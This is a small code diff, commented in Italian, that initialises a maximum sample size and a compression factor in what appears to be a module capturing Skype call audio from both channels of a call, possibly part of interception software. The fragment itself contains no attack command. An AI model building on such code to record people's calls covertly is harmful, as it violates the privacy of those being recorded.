@@ -113,8 +113,8 @@ DWORD sample_sampling[2] = {SAMPLE_RATE_SKYPE_W, SAMPLE_RATE_SKYPE_W}; // Sample
 FILETIME channel_time_start[2];		 // Time stamp di inizio chiamata
 FILETIME channel_time_last[2];       // Time stamp dell'ultimo campione
 BYTE *wave_array[2] = {NULL, NULL};	 // Buffer contenenti i PCM dei due canali
-DWORD max_sample_size; // Dimensione oltre la quale salva un sample su file
-DWORD compress_factor; // Fattore di compressione del codec
+DWORD max_sample_size = 500000; // Dimensione oltre la quale salva un sample su file
+DWORD compress_factor = 5; // Fattore di compressione del codec
 HMODULE codec_handle = NULL; // Handle alla dll del codec
 BOOL bPM_spmcp = FALSE; // Semaforo per l'uscita del thread
 HANDLE hSkypePMThread = NULL;
